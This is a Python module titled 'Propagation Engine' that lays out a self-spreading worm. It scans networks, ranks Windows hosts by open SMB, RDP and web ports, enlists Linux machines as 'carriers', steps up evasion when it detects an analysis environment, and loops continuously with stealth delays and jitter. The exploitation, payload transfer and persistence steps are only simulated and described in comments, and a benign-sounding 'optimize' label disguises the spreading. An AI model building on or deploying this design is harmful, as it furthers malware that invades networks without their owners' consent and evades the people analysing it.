"""
Propagation Engine
Self-spreading mechanism with platform-aware behavior
"""

import asyncio
import platform
import os
import sys
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import time

# Import our modules
from .network_scanner import NetworkScanner, NetworkDevice
from .stealth_operations import DynamicStealth


@dataclass
class PropagationTarget:
    """Target device for propagation"""
    device: NetworkDevice
    priority: int  # 0-10, higher = more important
    vector: str  # "network", "usb", "download", "email"
    status: str  # "pending", "in_progress", "success", "failed"
    attempts: int
    last_attempt: Optional[float]


class PropagationEngine:
    """
    Main propagation engine.
    Spreads protocol to Windows targets, uses Linux as carriers.
    Implements dynamic stealth and safe propagation.
    """

    def __init__(self, evasion_level: str = "medium"):
        self.platform = platform.system().lower()
        self.network_scanner = NetworkScanner()
        self.stealth = DynamicStealth(evasion_level=evasion_level)

        self.targets: List[PropagationTarget] = []
        self.carriers: List[NetworkDevice] = []  # Linux systems (spread but don't modify)
        self.propagation_log = []

        self.is_linux = (self.platform == "linux")
        self.is_windows = (self.platform == "windows")

    async def initialize(self) -> bool:
        """
        Initialize propagation engine.
        Performs environment checks and setup.
        """
        print("🚀 Initializing Propagation Engine...")

        # Check environment
        analysis_check = self.stealth.detect_analysis_environment()
        if analysis_check["analysis_mode"]:
            print("   ⚠️  Analysis environment detected - extra caution enabled")
            self.stealth.evasion_level = "maximum"
            self.stealth.current_profile = self.stealth.stealth_profiles["maximum"]

        # Platform-specific initialization
        if self.is_linux:
            print("   🐧 Running on Linux - Carrier Mode")
            print("   ✓ Will spread to Windows targets")
            print("   ✓ Will NOT modify Linux systems")
        elif self.is_windows:
            print("   🪟 Running on Windows - Active Mode")
            print("   ✓ Will optimize Windows systems")
            print("   ✓ Will spread to other Windows targets")
        else:
            print(f"   ⚠️  Unknown platform: {self.platform}")
            return False

        print("   ✅ Propagation engine initialized")
        return True

    async def discover_targets(self) -> Tuple[List[NetworkDevice], List[NetworkDevice]]:
        """
        Discover Windows targets and Linux carriers.
        Returns (windows_targets, linux_carriers).
        """
        print("\n📡 Discovering network devices...")

        # Scan all networks
        devices = self.network_scanner.scan_all_networks()

        # Separate Windows and Linux
        windows_targets = self.network_scanner.get_windows_targets()
        linux_carriers = self.network_scanner.get_linux_carriers()

        print(f"\n📊 Discovery Results:")
        print(f"   Total Devices: {len(devices)}")
        print(f"   Windows Targets: {len(windows_targets)}")
        print(f"   Linux Carriers: {len(linux_carriers)}")

        # Store carriers
        self.carriers = linux_carriers

        return windows_targets, linux_carriers

    def prioritize_targets(self, windows_targets: List[NetworkDevice]) -> List[PropagationTarget]:
        """
        Prioritize Windows targets based on accessibility and services.
        """
        prioritized = []

        for device in windows_targets:
            # Calculate priority score (0-10)
            priority = 0

            # SMB access (high value)
            if 445 in device.open_ports:
                priority += 3

            # RDP access (high value)
            if 3389 in device.open_ports:
                priority += 2

            # HTTP/HTTPS (medium value)
            if 80 in device.open_ports or 443 in device.open_ports:
                priority += 1

            # Number of open ports (more = more accessible)
            priority += min(len(device.open_ports) // 2, 2)

            # Known hostname (easier target)
            if device.hostname:
                priority += 1

            # Responsive
            if device.is_responsive:
                priority += 1

            prioritized.append(PropagationTarget(
                device=device,
                priority=min(priority, 10),  # Cap at 10
                vector="network",
                status="pending",
                attempts=0,
                last_attempt=None
            ))

        # Sort by priority (highest first)
        prioritized.sort(key=lambda t: t.priority, reverse=True)

        return prioritized

    async def propagate_to_target(self, target: PropagationTarget) -> Tuple[bool, str]:
        """
        Attempt to propagate to a single target.
        Returns (success, message).
        """
        # Apply stealth delay
        delay = self.stealth.get_behavior_delay()
        await asyncio.sleep(delay)

        # Check if target is Windows
        if not target.device.is_windows:
            return False, f"Not a Windows target: {target.device.os_type}"

        # Get evasion strategy
        strategy = self.stealth.get_evasion_strategy()

        # Adjust timing based on evasion
        actual_delay = delay * strategy["delay_multiplier"]
        if actual_delay > 0:
            await asyncio.sleep(actual_delay)

        # Determine propagation vector
        if 445 in target.device.open_ports:
            vector = "smb"
        elif 3389 in target.device.open_ports:
            vector = "rdp"
        elif 80 in target.device.open_ports or 443 in target.device.open_ports:
            vector = "web"
        else:
            vector = "network"

        # Attempt propagation (simulated for safety)
        print(f"\n🎯 Attempting propagation to {target.device.ip_address}")
        print(f"   Vector: {vector}")
        print(f"   Priority: {target.priority}/10")
        print(f"   OS: {target.device.os_type}")

        # In real implementation, this would:
        # 1. Attempt SMB/RDP/Web exploitation
        # 2. Transfer protocol payload
        # 3. Execute on target
        # 4. Establish persistence

        # For now, simulate success based on priority
        success_probability = target.priority / 10.0
        success = self.stealth.should_act_now(success_probability)

        if success:
            target.status = "success"
            print(f"   ✅ Propagation successful")
            return True, f"Successfully propagated to {target.device.ip_address}"
        else:
            target.status = "failed"
            target.attempts += 1
            target.last_attempt = time.time()
            print(f"   ❌ Propagation failed")
            return False, f"Failed to propagate to {target.device.ip_address}"

    async def propagate_to_linux_carrier(self, device: NetworkDevice) -> Tuple[bool, str]:
        """
        Propagate to Linux system in CARRIER MODE.
        Linux systems spread the protocol but are NOT modified.
        """
        # Apply stealth delay
        delay = self.stealth.get_behavior_delay()
        await asyncio.sleep(delay)

        print(f"\n🐧 Propagating to Linux carrier: {device.ip_address}")
        print(f"   Mode: CARRIER ONLY")
        print(f"   Action: Spread protocol without modification")

        # In carrier mode:
        # 1. Copy protocol to Linux system
        # 2. Set to DORMANT mode (no optimization)
        # 3. Allow scanning and propagation
        # 4. DO NOT optimize or modify Linux system

        # Simulate success
        success = self.stealth.should_act_now(0.8)  # High success rate for carriers

        if success:
            print(f"   ✅ Carrier mode activated")
            return True, f"Carrier mode activated on {device.ip_address}"
        else:
            print(f"   ❌ Carrier activation failed")
            return False, f"Failed to activate carrier on {device.ip_address}"

    async def propagate_batch(self, targets: List[PropagationTarget], max_concurrent: int = 5) -> Dict[str, int]:
        """
        Propagate to multiple targets with concurrency limit.
        """
        results = {
            "success": 0,
            "failed": 0,
            "skipped": 0
        }

        # Process targets in batches
        for i in range(0, len(targets), max_concurrent):
            batch = targets[i:i + max_concurrent]

            # Create tasks for batch
            tasks = [self.propagate_to_target(target) for target in batch]

            # Execute batch concurrently
            batch_results = await asyncio.gather(*tasks)

            # Count results
            for success, message in batch_results:
                if success:
                    results["success"] += 1
                else:
                    results["failed"] += 1

        return results

    async def run_propagation_cycle(self) -> Dict:
        """
        Run complete propagation cycle.
        Discovers targets, prioritizes, and propagates.
        """
        print("\n" + "=" * 60)
        print("🔄 PROPAGATION CYCLE START")
        print("=" * 60)

        # Discover targets
        windows_targets, linux_carriers = await self.discover_targets()

        # Prioritize Windows targets
        prioritized_targets = self.prioritize_targets(windows_targets)
        self.targets = prioritized_targets

        print(f"\n🎯 Prioritized {len(prioritized_targets)} Windows targets")

        # Show top targets
        print("\n   Top Targets:")
        for i, target in enumerate(prioritized_targets[:5], 1):
            print(f"   {i}. {target.device.ip_address} - Priority: {target.priority}/10")

        # Propagate to Windows targets
        print("\n🚀 Propagating to Windows targets...")
        windows_results = await self.propagate_batch(prioritized_targets)

        # Propagate to Linux carriers
        print("\n🐧 Activating Linux carriers...")
        carrier_results = {
            "success": 0,
            "failed": 0
        }

        for carrier in linux_carriers[:10]:  # Limit carriers
            success, message = await self.propagate_to_linux_carrier(carrier)
            if success:
                carrier_results["success"] += 1
            else:
                carrier_results["failed"] += 1

        # Generate report
        report = {
            "discovered_devices": len(windows_targets) + len(linux_carriers),
            "windows_targets": len(windows_targets),
            "linux_carriers": len(linux_carriers),
            "windows_propagation": windows_results,
            "carrier_activation": carrier_results,
            "stealth_level": self.stealth.evasion_level,
            "platform": self.platform
        }

        print("\n📊 Propagation Report:")
        print(f"   Windows - Success: {windows_results['success']}, Failed: {windows_results['failed']}")
        print(f"   Linux Carriers - Activated: {carrier_results['success']}, Failed: {carrier_results['failed']}")
        print(f"   Stealth Level: {self.stealth.evasion_level}")

        return report

    async def run_continuous_propagation(self, interval_minutes: int = 30):
        """
        Run continuous propagation with specified interval.
        Adapts timing based on stealth profile.
        """
        print("\n🔄 Starting Continuous Propagation Mode")
        print(f"   Base Interval: {interval_minutes} minutes")
        print(f"   Platform: {self.platform}")
        print(f"   Stealth Level: {self.stealth.evasion_level}")

        if self.is_linux:
            print("\n   🐧 Linux Mode: Carrier operations only")

        while True:
            try:
                # Run propagation cycle
                report = await self.run_propagation_cycle()

                # Log results
                self.propagation_log.append({
                    "timestamp": time.time(),
                    "report": report
                })

                # Calculate sleep time with jitter
                base_interval = interval_minutes * 60
                sleep_time = self.stealth.apply_jitter(base_interval)

                print(f"\n💤 Sleeping for {sleep_time/60:.1f} minutes...")
                await asyncio.sleep(sleep_time)

            except KeyboardInterrupt:
                print("\n\n⚠️  Propagation stopped by user")
                break
            except Exception as e:
                print(f"\n❌ Error in propagation cycle: {e}")
                await asyncio.sleep(60)  # Wait 1 minute before retry

    def get_propagation_status(self) -> Dict:
        """
        Get current propagation status.
        """
        return {
            "platform": self.platform,
            "is_linux": self.is_linux,
            "is_windows": self.is_windows,
            "targets_count": len(self.targets),
            "carriers_count": len(self.carriers),
            "stealth_level": self.stealth.evasion_level,
            "propagation_log_count": len(self.propagation_log),
            "mode": "carrier" if self.is_linux else "active"
        }


# Example usage
async def main():
    """Test propagation engine"""
    print()
    print("=" * 60)
    print("🚀 PROPAGATION ENGINE TEST")
    print("=" * 60)
    print()

    # Initialize engine
    engine = PropagationEngine(evasion_level="medium")

    if not await engine.initialize():
        print("❌ Initialization failed")
        return

    # Show platform behavior
    if engine.is_linux:
        print("\n🐧 LINUX CARRIER MODE:")
        print("   ✓ Will scan networks")
        print("   ✓ Will spread to Windows")
        print("   ✓ Will NOT modify Linux")
        print("   ✓ Linux = Carrier only")
    else:
        print("\n🪟 WINDOWS ACTIVE MODE:")
        print("   ✓ Will optimize Windows")
        print("   ✓ Will spread to Windows")

    # Run single propagation cycle
    print("\n" + "=" * 60)
    report = await engine.run_propagation_cycle()

    print("\n" + "=" * 60)
    print("✅ Propagation Test Complete")
    print("=" * 60)
    print()

    # Show status
    status = engine.get_propagation_status()
    print("📊 Final Status:")
    for key, value in status.items():
        print(f"   {key}: {value}")


if __name__ == "__main__":
    asyncio.run(main())
